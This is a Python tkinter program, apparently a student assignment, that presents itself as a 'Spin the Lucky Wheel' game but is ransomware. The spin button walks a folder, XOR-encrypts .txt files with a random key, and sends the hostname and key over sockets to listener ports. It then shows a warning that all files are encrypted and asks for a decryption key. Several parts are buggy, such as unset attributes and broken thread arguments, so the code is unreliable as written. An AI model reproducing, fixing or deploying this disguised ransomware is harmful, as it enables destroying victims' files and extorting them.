from tkinter import *
import tkinter.font as font
from tkinter import messagebox
from tkinter import ttk
#from PIL import Image
import queue
import mysql.connector
import os
import random
import socket
from datetime import datetime
import threading
from queue import Queue
from sql import *

#image = Image.open("spin.png")
#pic = image.resize((500, 600))
#pic.save('spin1.png')

class Main:
    def __init__(self, master):
        
        self.frame = Frame(master)    
        self.frame.pack(side=TOP,padx=100,  pady=100)

        convert=Button(self.frame, text='-Spin To Win-',command= self.run, bg='red',fg='Gold',width=30)
        convert.grid(row=5, columnspan=2, pady=20)

    def run(self):
        init = Encryption("E:\Python Semester 2\Assignment\Test")
        init.run()


class Encryption:
    def __init__(self, path):
        #file to encrypt
        self.encrypted_ext = ('.txt')
        self.path = path
        #all files from machine
        file_paths = []
        for root, dirs, files in os.walk("E:\Python Semester 2\Assignment\Test"):
            for file in files:
                file_path, file_ext = os.path.splitext(root+'\\'+file)
                if file_ext in self.encrypted_ext:
                    file_paths.append(root+'\\'+file)
        return file_paths

    def generate_key(self):
        #generate key
        key = ''
        encryption_level = 512 // 8
        self.char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789<>?,./:;[]}{|'
        self.char_pool_len = len(self.char_pool)
        

        for i in range(encryption_level):
            key += self.char_pool[random.randint(0, self.char_pool_len-1)]

        return key

    def server(self, data, port):
        hostname = os.getenv("COMPUTERNAME")
        # connect to server
        ip_address = socket.gethostbyname(hostname)
        port1 = 5666
        port2 = 5678
        port3 = 5679
        time = datetime.now()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip_address, port1))
                s.send(f'[{time}]'.encode('utf-8'))

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip_address, port2))
                s.send(f'{self.hostname}'.encode('utf-8'))

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip_address, port3))
                s.send(f'{self.key}'.encode('utf-8'))
        except:
            msg = messagebox.showwarning('Sorry', 'Our servers are busy right again. Try again later.')
        
    def encrypt(self, key, q):
        while q.not_empty:
            file = q.get()
            index = 0
            max_index =len(self.key) - 1
            try:
                with open(file, 'rb') as f:
                    data = f.read()
                with open(file,'w') as f:
                    f.write('')

                for byte in data:
                    xor_byte = byte ^ ord(self.key[index])
                    with open(file, 'ab') as f:
                        f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0 
                    else: 
                        index += 1
            except:
                print(f"Failed to encrypt {file}")
                q.task_done()
        q = Queue()
        for file in self.file_paths:
            q.put(file)

        for i in range(10):
            thread = threading.Thread(target=self.encrypt, args=(self.key,), daemon=True)
            thread.start()

        q.join()
        msg = messagebox.askquestion('Warning','All your files have been encrypted. Press Yes for decryption and No to quit the program.')
        if msg == 'yes':
            self.call()
        else:
            root.destroy()

    def call(self):
        openwindow = Decryption()

class Decryption:
    def __init__(self,key):
        root2 = Toplevel()
        root2.geometry('500x600+500+100')
        root2.title('Decryptor')

        self.frame2 = Frame(root2)
        self.frame2.pack(side=TOP, padx=100, pady=100)

        num=StringVar()
        num_from=Entry(self.frame2,width=40,textvariable= num,font=("Times New Roman", 16))
        num_from.grid(row=2, column=1)
        dec = Button(self.frame2, text='Decrypt', bg='red', fg='Gold', width=30)
        dec.grid(row=1, columnspan=2, pady=20)

        self.encrypted_ext = ('.txt',)
        self.file_paths = []
        self.q = queue.Queue()
        
    def encrypted_file_path(self, root_path):
        for root, dirs, files in os.walk(root_path):
            for file in files:
                file_path, file_ext = os.path.splitext(os.path.join(root, file))
                if file_ext in self.encrypted_ext:
                    self.file_paths.append(file_path)
        
    def decrypt(self, key):
        keys3 = '...some key...'
        try: 
            if key == keys3: 
                while not self.q.empty():
                    file = self.q.get()
                    index = 0
                    max_index = len(key) - 1
                    try:
                        with open(file, 'rb') as f:
                            data = f.read()
                        with open(file, 'w') as f:
                            f.write('')
                            for byte in data:
                                xor_byte = byte ^ ord(key[index])
                                with open(file, 'ab') as f:
                                    f.write(xor_byte.to_bytes(1, 'little'))
                                if index >= max_index:
                                    index = 0 
                                else: 
                                    index += 1
                    except:
                        msg = 'Failed to decrypt.'
                    self.q.task_done()
            else:
                msg = 'Wrong decryption Key.'
        except ValueError:
            msg = 'Wrong Decryption Key.'
        messagebox.showerror('Info', msg)

    def decrypt_files(self, key):
        for file_path in self.file_paths:
            self.q.put(file_path)
        for i in range(10):
            thread = threading.Thread(target=self.decrypt, args=(key,), daemon=True)
            thread.start()
        self.q.join()

       

#fonts-----------

root=Tk()
root.geometry('500x600+500+100')
#root.minsize(500,600)
#root.maxsize(500,600)
root.title('Spin the Lucky Wheel')
#root.configure(bg='Sky blue')
display = Main(root)
root.mainloop()
